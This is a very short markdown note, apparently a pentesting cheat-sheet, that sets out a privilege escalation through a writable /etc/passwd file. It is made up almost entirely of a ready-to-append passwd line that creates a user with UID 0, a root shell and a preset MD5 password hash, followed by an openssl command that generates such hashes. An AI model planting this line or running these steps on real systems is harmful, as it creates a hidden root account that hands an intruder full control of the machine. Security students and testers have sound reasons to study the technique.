# /etc/passwd writable line privilege escalation exploit

## write new root user line
```
c0:$1$coyote0x$S9Aruc4H1kvDizg..ij81.:0:0:root:/root:/bin/bash
```

## generate password
```bash
openssl passwd -1 -salt coyote0x90
```
